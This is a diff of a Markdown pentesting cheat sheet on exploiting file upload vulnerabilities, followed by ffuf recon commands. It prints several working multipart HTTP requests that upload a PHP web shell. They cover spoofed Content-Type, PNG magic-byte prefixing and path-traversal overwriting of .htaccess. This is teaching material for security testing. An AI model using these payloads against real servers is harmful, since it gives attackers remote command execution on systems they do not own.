@@ -17,46 +17,36 @@
 1. **Identifying file upload vulnerabilities**
    * Retrievable
    * Content-Type
-2.  **Exploiting simple file upload vulnerabilities**
+2. **Exploiting simple file upload vulnerabilities**
+   *   No restrictions
 
-    * No restrictions
+       ```http
+       POST /Api/FileUpload.aspx HTTP/2
+       Host: console.example.com
+       User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
+       Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
+       Accept: */*
 
-      ```http
-      POST /Api/FileUpload.aspx HTTP/2
-      Host: console.example.com
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
-      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
-      Accept: */*
-  
-      ------WebKitFormBoundary3RwPFJztxaJvrqAq
-      Content-Disposition: form-data; name="file"; filename="shell.php"
-      Content-Type: application/x-php
-  
-      <?php echo system($_GET['e']); ?>
-      ------WebKitFormBoundary3RwPFJztxaJvrqAq--
-      ```
+       ------WebKitFormBoundary3RwPFJztxaJvrqAq
+       Content-Disposition: form-data; name="file"; filename="shell.php"
+       Content-Type: application/x-php
 
-    * Bypassing client-side restrictions
-      *   HTML "accept" attribute
+       <?php echo system($_GET['e']); ?>
+       ------WebKitFormBoundary3RwPFJztxaJvrqAq--
+       ```
+   * Bypassing client-side restrictions
+     *   HTML "accept" attribute
 
-          ```html
-          <input type="file" accept=".jpg, .jpeg, .png, .gif" />
-          ```
-      * using proxy interceptors
-    *   Bypassing a file extension blacklist
+         ```html
+         <input type="file" accept=".jpg, .jpeg, .png, .gif" />
+         ```
+     * using proxy interceptors
+   *   Bypassing a file extension blacklist
 
-        <p align="center">
-          <img src=".gitbook/assets/file-upload-vuln1.png"><br>
-          <sub><strong>Bypass file extension exclusion lists</strong></sub>
-        </p>
+       <p align="center"><img src="broken-reference" alt="" data-size="original"><br><sub><strong>Bypass file extension exclusion lists</strong></sub></p>
+   *   Bypassing a file extension whitelist
 
-    *   Bypassing a file extension whitelist
-
-        <p align="center">
-          <img src=".gitbook/assets/file-upload-vuln2.png" width="600"><br>
-          <sub><strong>Bypass file extension inclusion lists</strong></sub>
-        </p>
-
+       <p align="center"><img src="broken-reference" alt=""><br><sub><strong>Bypass file extension inclusion lists</strong></sub></p>
 
 If the file upload implementation determines your file type by the content type, you can also attempt to upload a file with a whitelisted file extension but with your malicious content type:
 
@@ -77,50 +67,9 @@ Content-Type: application/x-php
 
 <p align="center">Take note of the <mark style="color:red;">filename</mark> and <mark style="color:red;">Content-Type</mark> in the example request above.</p>
 
-3. **Exploiting advanced file upload vulnerabilities**
+3.  **Exploiting advanced file upload vulnerabilities**
 
-* Bypassing content type restrictions
-
-  ```http
-  POST /Api/FileUpload.aspx HTTP/2
-  Host: console.example.com
-  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
-  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
-  Accept: */*
-  
-  ------WebKitFormBoundary3RwPFJztxaJvrqAq
-  Content-Disposition: form-data; name="file"; filename="shell.php"
-  Content-Type: image/png
-  
-  <?php echo system($_GET['e']); ?>
-  ------WebKitFormBoundary3RwPFJztxaJvrqAq--
-  ```
-
-* Magic bytes
-  *   These are the magic bytes for a normal image (PNG) in HEX:
-
-      `89 50 4E 47 0D 0A 1A 0A`
-
-      ```http
-      POST /Api/FileUpload.aspx HTTP/2
-      Host: console.example.com
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
-      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
-      Accept: */*
-      
-      ------WebKitFormBoundary3RwPFJztxaJvrqAq
-      Content-Disposition: form-data; name="file"; filename="shell.php"
-      Content-Type: application/x-php
-      
-      ‰PNG␍␊␚␊
-      <?php echo system($_GET['e']); ?>
-      ------WebKitFormBoundary3RwPFJztxaJvrqAq--
-      ```
-
-<p align="center"><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of file signatures - Wikipedia</a></p>
-
-* Overwriting server configuration files
-  * .htaccess
+    * Bypassing content type restrictions
 
     ```http
     POST /Api/FileUpload.aspx HTTP/2
@@ -128,14 +77,60 @@ Content-Type: application/x-php
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
     Accept: */*
-    
+
     ------WebKitFormBoundary3RwPFJztxaJvrqAq
-    Content-Disposition: form-data; name="file"; filename="../../../.htaccess"
-    Content-Type: text/plain
-    
-    # Your server configuraton rules
+    Content-Disposition: form-data; name="file"; filename="shell.php"
+    Content-Type: image/png
+
+    <?php echo system($_GET['e']); ?>
     ------WebKitFormBoundary3RwPFJztxaJvrqAq--
     ```
+
+    *   Magic bytes
+
+        * These are the magic bytes for a normal image (PNG) in HEX:
+
+        ```sh
+        89 50 4E 47 0D 0A 1A 0A
+        ```
+
+
+
+        ```http
+        POST /Api/FileUpload.aspx HTTP/2
+        Host: console.example.com
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
+        Accept: */*
+
+        ------WebKitFormBoundary3RwPFJztxaJvrqAq
+        Content-Disposition: form-data; name="file"; filename="shell.php"
+        Content-Type: application/x-php
+
+        ‰PNG␍␊␚␊
+        <?php echo system($_GET['e']); ?>
+        ------WebKitFormBoundary3RwPFJztxaJvrqAq--
+        ```
+
+        <p align="center"><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of file signatures - Wikipedia</a></p>
+    *   Overwriting server configuration files
+
+        * .htaccess
+
+        ```http
+        POST /Api/FileUpload.aspx HTTP/2
+        Host: console.example.com
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
+        Accept: */*
+
+        ------WebKitFormBoundary3RwPFJztxaJvrqAq
+        Content-Disposition: form-data; name="file"; filename="../../../.htaccess"
+        Content-Type: text/plain
+
+        # Your server configuraton rules
+        ------WebKitFormBoundary3RwPFJztxaJvrqAq--
+        ```
 
 ***
 
@@ -155,15 +150,15 @@ Content-Type: application/x-php
    1. [CeWL](https://github.com/digininja/CeWL)
 2. **Virtual host (VHost) enumeration**
 
-  ```sh
-  ffuf -u https://example.com -H "Host: FUZZ.example.com" -w /path/to/wordlist
-  ```
+```sh
+ffuf -u https://example.com -H "Host: FUZZ.example.com" -w /path/to/wordlist
+```
 
 3. **Forced browsing using different HTTP methods**
 
-  ```sh
-  ffuf -u https://api.example.com/PATH -X METHOD -w /path/to/wordlist:PATH -w /path/to/http_methods:METHOD
-  ```
+```sh
+ffuf -u https://api.example.com/PATH -X METHOD -w /path/to/wordlist:PATH -w /path/to/http_methods:METHOD
+```
 
 4. **JavaScript file monitoring**
    1. [JSMON](https://github.com/robre/jsmon)
